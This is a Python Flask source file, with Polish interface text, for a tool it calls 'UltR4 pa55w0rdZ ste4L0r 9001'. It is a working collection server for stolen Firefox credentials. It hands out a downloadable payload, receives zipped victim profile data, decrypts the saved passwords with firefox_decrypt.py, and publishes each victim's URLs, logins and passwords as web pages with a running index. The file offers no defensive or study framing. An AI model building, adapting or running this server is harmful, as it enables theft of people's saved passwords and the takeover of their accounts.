from flask import Flask, request, send_from_directory, redirect
import os, uuid, shutil, subprocess, csv, io

app = Flask(__name__)

UPLOADS = "uploads"
TEMP = "temp"
HTML = "html"
STATIC = "static"

os.makedirs(UPLOADS, exist_ok=True)
os.makedirs(TEMP, exist_ok=True)
os.makedirs(HTML, exist_ok=True)
os.makedirs(STATIC, exist_ok=True)

def wrap_page(title, body_html):
    return f"""<!DOCTYPE html>
<html lang=\"pl\">
<head>
  <meta charset=\"UTF-8\" />
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
  <title>{title}</title>
  <link href=\"https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap\" rel=\"stylesheet\">
  <style>
    body {{ background-color: #0f0f0f; color: #39ff14; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; }}
    .container {{ max-width: 1000px; margin: 60px auto; padding: 40px; background-color: #111; box-shadow: 0 0 20px #39ff14; border-radius: 10px; text-align: center; }}
    h1 {{ font-size: 2.5em; margin-bottom: 30px; text-shadow: 0 0 20px #39ff14; }}
    table {{ width: 100%; border-collapse: collapse; margin-top: 30px; }}
    th, td {{ border: 1px solid #39ff14; padding: 12px; text-align: left; }}
    th {{ background-color: #1a1a1a; }}
    tr:nth-child(even) {{ background-color: #141414; }}
    tr:hover {{ background-color: #222; }}
    ul {{ list-style: none; padding: 0; }}
    li {{ margin: 15px 0; }}
    a {{ display: inline-block; padding: 12px 24px; border: 2px solid #39ff14; border-radius: 8px; color: #39ff14; text-decoration: none; font-size: 1.2em; transition: all 0.3s ease-in-out; }}
    a:hover {{ background-color: #39ff14; color: #000; box-shadow: 0 0 20px #39ff14; }}
    .footer {{ margin-top: 40px; font-size: 0.9em; color: #555; }}
  </style>
</head>
<body>
  <div class=\"container\">
    {body_html}
    <div class=\"footer\">zasilane łzami helpdesku i popiołem polityki bezpieczeństwa</div>
  </div>
</body>
</html>"""

@app.route("/payload.txt")
def serve_payload():
    return send_from_directory(STATIC, "payload.txt")

@app.route("/upload", methods=["POST"])
def upload():
    if not request.data:
        return "Brak danych", 400

    uid = str(uuid.uuid4())[:8]
    zip_path = os.path.join(UPLOADS, f"{uid}.zip")
    extract_path = os.path.join(TEMP, uid)
    result_html = os.path.join(HTML, f"{uid}.html")

    with open(zip_path, "wb") as f:
        f.write(request.data)
    os.makedirs(extract_path, exist_ok=True)
    shutil.unpack_archive(zip_path, extract_path)

    result = subprocess.run(
        ["python", "firefox_decrypt.py", "-f", "csv", extract_path],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        return f"Błąd dekodowania: {result.stderr}", 500

    csv_data = "\n".join([
        l for l in result.stdout.strip().splitlines()
        if l.startswith('"') or l.lower().startswith("url") or ";" in l
    ])
    reader = csv.reader(io.StringIO(csv_data), delimiter=";", quotechar='"')
    rows = list(reader)

    table = "<h1>🔐 Odszyfrowane hasła</h1><table><tr><th>URL</th><th>Login</th><th>Hasło</th></tr>"
    for row in rows[1:]:
        if len(row) == 3:
            table += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td></tr>"
    table += "</table>"

    with open(result_html, "w", encoding="utf-8") as f:
        f.write(wrap_page("🔐 Odszyfrowane hasła", table))

    all_files = sorted(os.listdir(HTML), reverse=True)
    list_items = "\n".join([
        f"<li><a href='/html/{file}'>{file}</a></li>"
        for file in all_files if file.endswith(".html") and file != "index.html"
    ])
    index_body = f"<h1>📂 Zdekodowane dane</h1><ul>{list_items}</ul>"

    with open(os.path.join(HTML, "index.html"), "w", encoding="utf-8") as f:
        f.write(wrap_page("📂 Zdekodowane dane", index_body))

    shutil.rmtree(extract_path)
    os.remove(zip_path)

    return redirect(f"/html/{uid}.html")

@app.route("/html/<path:filename>")
def serve_html(filename):
    return send_from_directory(HTML, filename)

@app.route("/html/")
def html_index():
    return send_from_directory(HTML, "index.html")

@app.route("/")
def index():
    body = """
    <h1>UltR4 pa55w0rdZ ste4L0r 9001</h1>
    <a href=\"/payload.txt\">📦 Pobierz payload</a>
    <a href=\"/html/\">🔓 Zobacz odszyfrowane dane</a>
    """
    return wrap_page("UL7R4 P455W0RDZ 5T34L0R 9001", body)

if __name__ == "__main__":
    print("🚀 Serwer lokalny działa na http://localhost:8080/")
    app.run(host="0.0.0.0", port=8080)